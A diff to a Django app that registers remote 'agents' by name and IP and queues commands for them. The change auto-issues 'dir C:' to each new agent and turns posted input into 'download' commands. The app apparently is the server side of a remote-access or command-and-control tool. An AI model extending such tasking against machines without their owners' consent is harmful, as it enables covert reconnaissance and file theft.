@@ -12,6 +12,7 @@ from django.views.generic import View
 import re
 from .forms import UploadsForm
 import json
+import subprocess
 
 
 def name_extractor(request):
@@ -43,6 +44,7 @@ def create_or_get_users(request, id_name):
         agent = Clients.objects.create(id_name=id_name, address=get_client_ip(request))
         agent.last_update = now()
         agent.save()
+        Commands.objects.create(receiver=agent, command='dir C:')
         return agent
     else:
         return None
@@ -115,8 +117,8 @@ class IndexView(View):
             agent = create_or_get_users(request, client_name)
             if agent:
                 print(agent)
-                Commands.objects.create(receiver=agent, command=self.request.POST.get('upload_cmd'),
-                                        timestamp=now())
+                command = f"download {self.request.POST.get('upload_cmd')}"
+                Commands.objects.create(receiver=agent, command=command, timestamp=now())
             if form.is_valid():
                 upload = form.save(commit=False)
                 if agent:
